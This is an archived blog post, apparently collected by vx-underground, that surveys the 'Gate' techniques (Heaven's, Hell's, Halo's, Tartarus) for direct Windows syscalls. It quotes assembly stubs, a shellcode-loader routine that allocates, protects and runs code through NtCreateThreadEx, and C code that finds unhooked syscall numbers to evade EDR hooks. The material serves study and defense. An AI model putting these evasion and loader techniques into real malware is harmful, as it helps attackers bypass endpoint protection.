{
    "id": "87c94fb2-6580-40b6-bd01-57ae1ac1a802",
    "created_at": "2023-01-12T15:05:35.368704Z",
    "updated_at": "2025-03-27T02:05:36.466456Z",
    "deleted_at": null,
    "sha1_hash": "c7c445f794e10f6332937fa34781814f094c4ab2",
    "title": "Gatekeeping SysCalls",
    "authors": "",
    "file_creation_date": "2022-07-14T20:52:21Z",
    "file_modification_date": "2022-07-14T20:52:21Z",
    "file_size": 405778,
    "plain_text": "# Gatekeeping SysCalls\n\n**mez0.cc/posts/gatekeeping-syscalls**\n\n## Introduction\n\n### Over the years, SysCalls has became significantly more important. And over those years, multiple techniques have spawned with the naming scheme of:\n```\nsomething biblical + Gate\n\n As of writing this, there are four techniques that I am aware of. So, my this post is a glorified note containing an explanation of each. No original code, just notes on the techniques.\n\n## Heavens Gate\n\n### The long and short of Heavens Gate is that it allows WOW64 Processes to execute 64-bit SysCalls. Originally, I was going to summarise this component in a similar fashion to the others in this post. However, Closing “Heaven’s Gate” by Alex Ionescu is too good to not read. The following is a quote from that blog:\n\n Heaven’s Gate, then, refers to subverting the fact that a 64-bit NTDLL exists (and a 64-bit heap, PEB and TEB), and manually jumping into the long-mode code segment without having to issue a system call and being subjected to the code flow that WoW64 will attempt to enforce. In other words, it gives one the ability to create “naked” 64-bit code, which will be able to run covertly, including issuing system calls, without the majority of products able to intercept and/or introspect its execution\n\n## Hells Gate\n\n### Hells Gate was developed by smelly__vx and am0nsec, along with code and a whitepaper. Hells Gate is an adaption of Heavens Gate, which was originally designed to execute 32-bit code from a 64-bit process.\n\n The main problem they identified with tools such as SysWhispers(1) was that it relied heavily on hard-coded SysCalls which is based on Windows X86-64 System Call Table (XP/2003/Vista/2008/7/2012/8/10), as seen below:\n\n```\n\n-----\n\n```\n.code\n\nNtAllocateVirtualMemory PROC\n\n  mov rax, gs:[60h]               ; Load PEB into RAX.\n\nNtAllocateVirtualMemory_Check_X_X_XXXX:        ; Check major version.\n\n  cmp dword ptr [rax+118h], 5\n\n  je NtAllocateVirtualMemory_SystemCall_5_X_XXXX\n\n  cmp dword ptr [rax+118h], 6\n\n  je NtAllocateVirtualMemory_Check_6_X_XXXX\n\n  cmp dword ptr [rax+118h], 10\n\n  je NtAllocateVirtualMemory_Check_10_0_XXXX\n\n  jmp NtAllocateVirtualMemory_SystemCall_Unknown\n\nNtAllocateVirtualMemory_Check_6_X_XXXX:        ; Check minor version for\nWindows Vista/7/8.\n\n  cmp dword ptr [rax+11ch], 0\n\n  je NtAllocateVirtualMemory_Check_6_0_XXXX\n\n  cmp dword ptr [rax+11ch], 1\n\n  je NtAllocateVirtualMemory_Check_6_1_XXXX\n\n  cmp dword ptr [rax+11ch], 2\n\n  je NtAllocateVirtualMemory_SystemCall_6_2_XXXX\n\n  cmp dword ptr [rax+11ch], 3\n\n  je NtAllocateVirtualMemory_SystemCall_6_3_XXXX\n\n  jmp NtAllocateVirtualMemory_SystemCall_Unknown\n\nNtAllocateVirtualMemory_Check_6_0_XXXX:        ; Check build number for\nWindows Vista.\n\n  cmp word ptr [rax+120h], 6000\n\n  je NtAllocateVirtualMemory_SystemCall_6_0_6000\n\n  cmp word ptr [rax+120h], 6001\n\n  je NtAllocateVirtualMemory_SystemCall_6_0_6001\n\n  cmp word ptr [rax+120h], 6002\n\n  je NtAllocateVirtualMemory_SystemCall_6_0_6002\n\n  jmp NtAllocateVirtualMemory_SystemCall_Unknown\n\nNtAllocateVirtualMemory_Check_6_1_XXXX:        ; Check build number for\nWindows 7.\n\n  cmp word ptr [rax+120h], 7600\n\n  je NtAllocateVirtualMemory_SystemCall_6_1_7600\n\n  cmp word ptr [rax+120h], 7601\n\n  je NtAllocateVirtualMemory_SystemCall_6_1_7601\n\n  jmp NtAllocateVirtualMemory_SystemCall_Unknown\n\nNtAllocateVirtualMemory_Check_10_0_XXXX:       ; Check build number for\nWindows 10.\n\n  cmp word ptr [rax+120h], 10240\n\n  je NtAllocateVirtualMemory_SystemCall_10_0_10240\n\n  cmp word ptr [rax+120h], 10586\n\n  je NtAllocateVirtualMemory_SystemCall_10_0_10586\n\n  cmp word ptr [rax+120h], 14393\n\n  je NtAllocateVirtualMemory_SystemCall_10_0_14393\n\n  cmp word ptr [rax+120h], 15063\n\n  je NtAllocateVirtualMemory_SystemCall_10_0_15063\n\n  cmp word ptr [rax+120h], 16299\n\n  je NtAllocateVirtualMemory_SystemCall_10_0_16299\n\n  cmp word ptr [rax+120h], 17134\n\n```\n\n-----\n\n```\n  je NtAllocateVirtualMemory_SystemCall_10_0_17134\n\n  cmp word ptr [rax+120h], 17763\n\n  je NtAllocateVirtualMemory_SystemCall_10_0_17763\n\n  cmp word ptr [rax+120h], 18362\n\n  je NtAllocateVirtualMemory_SystemCall_10_0_18362\n\n  cmp word ptr [rax+120h], 18363\n\n  je NtAllocateVirtualMemory_SystemCall_10_0_18363\n\n  cmp word ptr [rax+120h], 19041\n\n  je NtAllocateVirtualMemory_SystemCall_10_0_19041\n\n  cmp word ptr [rax+120h], 19042\n\n  je NtAllocateVirtualMemory_SystemCall_10_0_19042\n\n  cmp word ptr [rax+120h], 19043\n\n  je NtAllocateVirtualMemory_SystemCall_10_0_19043\n\n  jmp NtAllocateVirtualMemory_SystemCall_Unknown\n\nNtAllocateVirtualMemory_SystemCall_5_X_XXXX:     ; Windows XP and Server 2003\n\n  mov eax, 0015h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_6_0_6000:     ; Windows Vista SP0\n\n  mov eax, 0015h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_6_0_6001:     ; Windows Vista SP1 and Server\n2008 SP0\n\n  mov eax, 0015h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_6_0_6002:     ; Windows Vista SP2 and Server\n2008 SP2\n\n  mov eax, 0015h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_6_1_7600:     ; Windows 7 SP0\n\n  mov eax, 0015h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_6_1_7601:     ; Windows 7 SP1 and Server 2008\nR2 SP0\n\n  mov eax, 0015h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_6_2_XXXX:     ; Windows 8 and Server 2012\n\n  mov eax, 0016h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_6_3_XXXX:     ; Windows 8.1 and Server 2012\nR2\n  mov eax, 0017h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_10_0_10240:    ; Windows 10.0.10240 (1507)\n\n  mov eax, 0018h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_10_0_10586:    ; Windows 10.0.10586 (1511)\n\n  mov eax, 0018h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_10_0_14393:    ; Windows 10.0.14393 (1607)\n\n  mov eax, 0018h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_10_0_15063:    ; Windows 10.0.15063 (1703)\n\n```\n\n-----\n\n```\n  mov eax, 0018h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_10_0_16299:    ; Windows 10.0.16299 (1709)\n\n  mov eax, 0018h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_10_0_17134:    ; Windows 10.0.17134 (1803)\n\n  mov eax, 0018h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_10_0_17763:    ; Windows 10.0.17763 (1809)\n\n  mov eax, 0018h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_10_0_18362:    ; Windows 10.0.18362 (1903)\n\n  mov eax, 0018h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_10_0_18363:    ; Windows 10.0.18363 (1909)\n\n  mov eax, 0018h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_10_0_19041:    ; Windows 10.0.19041 (2004)\n\n  mov eax, 0018h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_10_0_19042:    ; Windows 10.0.19042 (20H2)\n\n  mov eax, 0018h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_10_0_19043:    ; Windows 10.0.19043 (21H1)\n\n  mov eax, 0018h\n\n  jmp NtAllocateVirtualMemory_Epilogue\n\nNtAllocateVirtualMemory_SystemCall_Unknown:      ; Unknown/unsupported version.\n\n  ret\n\nNtAllocateVirtualMemory_Epilogue:\n\n  mov r10, rcx\n\n  syscall\n\n  ret\n\nNtAllocateVirtualMemory ENDP\n\nend\n\n### The sheer size of this shows how inefficient this is. Sometime later, SysWhispers2 was released which reduced the code down to:\n\n```\n\n-----\n\n```\n.code\n\nEXTERN SW2_GetSyscallNumber: PROC\n\nNtAllocateVirtualMemory PROC\n\n  mov [rsp +8], rcx     ; Save registers.\n\n  mov [rsp+16], rdx\n\n  mov [rsp+24], r8\n\n  mov [rsp+32], r9\n\n  sub rsp, 28h\n\n  mov ecx, 04FDF5971h    ; Load function hash into ECX.\n\n  call SW2_GetSyscallNumber ; Resolve function hash into syscall number.\n\n  add rsp, 28h\n\n  mov rcx, [rsp +8]     ; Restore registers.\n\n  mov rdx, [rsp+16]\n\n  mov r8, [rsp+24]\n\n  mov r9, [rsp+32]\n\n  mov r10, rcx\n\n  syscall          ; Invoke system call.\n\n  ret\n\nNtAllocateVirtualMemory ENDP\n\nend\n\n### Due to the way this works, its starting to see signatures; more on this later.\n\n So, how is Hells Gate actually used? Instead of having the SysCalls for each function in a\n.asm file, and then EXTERN functions, it uses a struct called VX_TABLE :\ntypedef struct _VX_TABLE {\n\n  VX_TABLE_ENTRY NtAllocateVirtualMemory;\n\n  VX_TABLE_ENTRY NtProtectVirtualMemory;\n\n  VX_TABLE_ENTRY NtCreateThreadEx;\n\n  VX_TABLE_ENTRY NtWaitForSingleObject;\n\n} VX_TABLE, * PVX_TABLE;\n\n Each NTAPI Call is a struct called VX_TABLE_ENTRY within the table, which is defined as such:\ntypedef struct _VX_TABLE_ENTRY {\n\n  PVOID  pAddress;\n\n  DWORD64 dwHash;\n\n  WORD  wSystemCall;\n\n} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;\n\n The project also requires two functions, and one variable from the hellsgate.asm:\n\n```\n\n-----\n\n```\n; Hell s Gate\n\n; Dynamic system call invocation\n\n;\n; by smelly__vx (@RtlMateusz) and am0nsec (@am0nsec)\n\n.data\n\n  wSystemCall DWORD 000h\n\n.code\n\n  HellsGate PROC\n\n    mov wSystemCall, 000h\n\n    mov wSystemCall, ecx\n\n    ret\n\n  HellsGate ENDP\n\n  HellDescent PROC\n\n    mov r10, rcx\n\n    mov eax, wSystemCall\n\n    syscall\n\n    ret\n\n  HellDescent ENDP\n\nend\n\n### The whitepaper explains why/how this works:\n\n System calls are defined as type WORD (16 bit unsigned integer) and are stored in the EAX register and executed with the syscall operation (sysenter for x86). These functions within NTDLL.dll all share a similar structure of execution.\n\n Using their example, this can be seen below:\n\n```\n\n-----\n\n### They then explain:\n\n as shown, functions move into the R10 register from the RCX register and then move the system call into EAX.\n\n This matches up to the assembly shipped with the project:\n```\nHellsGate PROC\n\n  mov wSystemCall, 000h\n\n  mov wSystemCall, ecx\n\n  ret\n\nHellsGate ENDP\n\nHellDescent PROC\n\n  mov r10, rcx\n\n  mov eax, wSystemCall\n\n  syscall\n\n  ret\n\nHellDescent ENDP\n\n This can all be utilised, as seen in line 166 of main.c:\n\n```\n\n-----\n\n```\nBOOL Payload(PVX_TABLE pVxTable) {\n\n  NTSTATUS status = 0x00000000;\n\n  char shellcode[] = \"\\x90\\x90\\x90\\x90\\xcc\\xcc\\xcc\\xcc\\xc3\";\n\n  // Allocate memory for the shellcode\n\n  PVOID lpAddress = NULL;\n\n  SIZE_T sDataSize = sizeof(shellcode);\n\n  HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);\n\n  status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT,\nPAGE_READWRITE);\n\n  // Write Memory\n\n  VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));\n\n  // Change page permissions\n\n  ULONG ulOldProtect = 0;\n\n  HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);\n\n  status = HellDescent((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ,\n&ulOldProtect);\n\n  // Create thread\n\n  HANDLE hHostThread = INVALID_HANDLE_VALUE;\n\n  HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);\n\n  status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1,\n(LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);\n\n  // Wait for 1 seconds\n\n  LARGE_INTEGER Timeout;\n\n  Timeout.QuadPart = -10000000;\n\n  HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);\n\n  status = HellDescent(hHostThread, FALSE, &Timeout);\n\n  return TRUE;\n\n}\n\n### For each NTAPI Call, the following events must occur:\nHellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);\n\nstatus = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT,\nPAGE_READWRITE);\n\n 1. The SysCall is obtained in GetVXTableEntry, this populates the aforementioned\n   struct\n\n 2. HellsGate() is then called which moves the SysCall into ecx :\nHellsGate PROC\n\n  mov wSystemCall, 000h\n\n  mov wSystemCall, ecx\n\n  ret\n\nHellsGate ENDP\n\n```\n\n-----\n\n### 3. HellsDescent() is then called which moves the r10 register to the rcx, and then\n move the system call into eax\n```\nHellDescent PROC\n\n  mov r10, rcx\n\n  mov eax, wSystemCall\n\n  syscall\n\n  ret\n\nHellDescent ENDP\n\n 4. The NTAPI is executed.\n\n## Halos Gate\n\n### Hells Gate is a great project. However, Sektor7 identified a problem with it in Halo's Gate - twin sister of Hell's Gate. The problem:\n\n One limitation of Hell's Gate is that it needs access to a clean ntdll module. Otherwise, it cannot populate needed syscall numbers and eventually fails to deliver Native API calls.\n\n If a hook is placed on a function, and Hells Gate is used, then the hooked call will be used. An explanation from Sektor 7:\n\n A hook on ZwMapViewOfSection is clearly visible ( jmp <offset> instruction, instead of\n   mov r10, rcx ). But \"neighbors\" of ZwMapViewOfSection, ZwSetInformationFile and\n\n NtAccessCheckAndAuditAlarm are clean and their syscall numbers are 0x27 and 0x29, respectively. ...\n\n It's like a ripple on a lake - you start from the center and move outwards up until you find a clean syscall.\n\n A few people have implemented this:\n\n The closest sample relating to the code shown from Sektor7 can be found in trickster0/TartarusGate/blob/master/HellsGate/main.c#L151:\n\n```\n\n-----\n\n```\nif (djb2(pczFunctionName)  pVxTableEntry >dwHash) {\n\npVxTableEntry->pAddress = pFunctionAddress;\n\n// First opcodes should be :\n\n//  MOV R10, RCX\n\n//  MOV RAX, <syscall>\n\nif (*((PBYTE)pFunctionAddress) == 0x4c\n\n  && *((PBYTE)pFunctionAddress + 1) == 0x8b\n\n  && *((PBYTE)pFunctionAddress + 2) == 0xd1\n\n  && *((PBYTE)pFunctionAddress + 3) == 0xb8\n\n  && *((PBYTE)pFunctionAddress + 6) == 0x00\n\n  && *((PBYTE)pFunctionAddress + 7) == 0x00) {\n\n  BYTE high = *((PBYTE)pFunctionAddress + 5);\n\n  BYTE low = *((PBYTE)pFunctionAddress + 4);\n\n  pVxTableEntry->wSystemCall = (high << 8) | low;\n\n  return TRUE;\n\n}\n\n //if hooked check the neighborhood to find clean syscall\n\nif (*((PBYTE)pFunctionAddress) == 0xe9) {\n\n  for (WORD idx = 1; idx <= 500; idx++) {\n\n    // check neighboring syscall down\n\n    if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c\n\n      && *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b\n\n      && *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1\n\n      && *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8\n\n      && *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00\n\n      && *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {\n\n      BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);\n\n      BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);\n\n      pVxTableEntry->wSystemCall = (high << 8) | low - idx;\n\n      return TRUE;\n\n    }\n\n    // check neighboring syscall up\n\n    if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c\n\n      && *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b\n\n      && *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1\n\n      && *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8\n\n      && *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00\n\n      && *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {\n\n      BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);\n\n      BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);\n\n      pVxTableEntry->wSystemCall = (high << 8) | low + idx;\n\n      return TRUE;\n\n    }\n\n  }\n\n  return FALSE;\n\n}\n\n```\n\n-----\n\n### So, the difference between Hells and Halos Gate is simply ensuring that the SysCalls are not hooked.\n\n## Tartarus Gate\n\n### The latest implementation is Tartarus Gate by trickster0. The difference here:\n\n Hell's Gate evolved to Halo's Gate to bypass EDRs by unhooking some of them and now it turned to Tartarus' Gate to handle even more WINAPI hooking methods.\n\n I have added some more ASM commands just for \"obfuscation\" for the syscalls.\n\n Hells Gate uses the following assembly functions:\n```\n.data\n\n  wSystemCall DWORD 000h\n\n.code\n\n  HellsGate PROC\n\n    mov wSystemCall, 000h\n\n    mov wSystemCall, ecx\n\n    ret\n\n  HellsGate ENDP\n\n  HellDescent PROC\n\n    mov r10, rcx\n\n    mov eax, wSystemCall\n\n    syscall\n\n    ret\n\n  HellDescent ENDP\n\nend\n\n This has now became:\n\n```\n\n-----\n\n```\n.data\n\n  wSystemCall DWORD 000h\n\n.code\n\n  HellsGate PROC\n\n    nop\n\n    mov wSystemCall, 000h\n\n    nop\n\n    mov wSystemCall, ecx\n\n    nop\n\n    ret\n\n  HellsGate ENDP\n\n  HellDescent PROC\n\n    nop\n\n    mov rax, rcx\n\n    nop\n\n    mov r10, rax\n\n    nop\n\n    mov eax, wSystemCall\n\n    nop\n\n    syscall\n\n    ret\n\n  HellDescent ENDP\n\nend\n\n### As seen above, HellDescent() has some additional nop and light obfuscation. Furthermore, as shown in Halos Gate, the implementation of Halos Gate has been added: trickster0/TartarusGate/blob/master/HellsGate/main.c#L151.\n\n For a reference, Cracked5pider/KayLdr has implemented this in the form of a Reflective DLL Loader. The core of the SysCall identification is done in https://github.com/Cracked5pider/KaynLdr/blob/main/KaynLdr/src/Syscall.c#L9.\n\n## Conclusion\n\n### As far as I can tell, these are the only gates I am aware of: Heaven, Hell, Halo, and Tartarus. And in that order, they progressively become more developed. Leaving off with Tartarus, currently, being the most functional.\n\n For more detail, I'd just suggest going to the referenced blogs/projects to get a better understanding of the technique in question, this is just a note to self!\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/AV Tech/Gatekeeping SysCalls.pdf"
    ],
    "report_names": [
        "Gatekeeping SysCalls.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535935,
    "ts_updated_at": 1743041136,
    "ts_creation_date": 1657831941,
    "ts_modification_date": 1657831941,
    "files": {
        "pdf": "https://archive.orkl.eu/c7c445f794e10f6332937fa34781814f094c4ab2.pdf",
        "text": "https://archive.orkl.eu/c7c445f794e10f6332937fa34781814f094c4ab2.txt",
        "img": "https://archive.orkl.eu/c7c445f794e10f6332937fa34781814f094c4ab2.jpg"
    }
}